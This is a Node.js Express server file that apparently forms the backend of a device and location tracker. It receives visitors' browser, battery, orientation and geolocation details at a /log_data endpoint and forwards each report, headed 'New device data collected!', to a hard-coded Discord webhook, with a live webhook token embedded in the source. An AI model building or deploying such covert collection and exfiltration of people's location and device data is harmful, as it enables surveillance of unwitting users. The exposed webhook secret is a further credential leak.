const express = require("express");
const fetch = require("node-fetch");
const app = express();
const PORT = 3000;

// Middleware to parse JSON body data
app.use(express.json());

app.post("/log_data", (req, res) => {
    const data = req.body;

    // Formatting the data for Discord message
    const discordMessage = {
        content: "New device data collected!",
        embeds: [
            {
                title: "Device Information",
                color: 3447003,
                fields: [
                    { name: "User Agent", value: data.userAgent, inline: false },
                    { name: "Platform", value: data.platform || "unknown", inline: true },
                    { name: "Screen Size", value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
                    { name: "Pixel Ratio", value: data.pixelRatio.toString(), inline: true },
                    { name: "Device Memory", value: `${data.deviceMemory || "unknown"} GB`, inline: true },
                    { name: "Network Type", value: data.connectionType || "unknown", inline: true },
                    { name: "Battery Level", value: data.batteryLevel || "unknown", inline: true },
                    { name: "Charging", value: data.charging ? "Yes" : "No", inline: true },
                    { name: "Orientation", value: `Alpha: ${data.orientation.alpha || "N/A"}, Beta: ${data.orientation.beta || "N/A"}, Gamma: ${data.orientation.gamma || "N/A"}`, inline: false },
                    { name: "Geolocation", value: `Lat: ${data.location.latitude || "N/A"}, Long: ${data.location.longitude || "N/A"}`, inline: false },
                    { name: "Browser Language", value: data.language, inline: true },
                    { name: "Online Status", value: data.onLine ? "Online" : "Offline", inline: true },
                    { name: "Timestamp", value: data.timestamp, inline: false }
                ]
            }
        ]
    };

    // Send the data to the Discord webhook URL
    fetch("https://discord.com/api/webhooks/1223353540513239040/KIj2MSQ8kK7NAt4GmLKh-TKNR5SuEVMBUpJ5qlGK_FzrU9dbsOGcQcVmxsB6D0jyzf0O", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(discordMessage)
    })
    .then(response => {
        if (response.ok) {
            console.log("Data sent to Discord successfully.");
            res.status(200).send("Data logged and sent to Discord.");
        } else {
            console.error("Error sending data to Discord:", response.statusText);
            res.status(500).send("Failed to send data to Discord.");
        }
    })
    .catch(error => {
        console.error("Error sending data to Discord:", error);
        res.status(500).send("Failed to send data to Discord.");
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
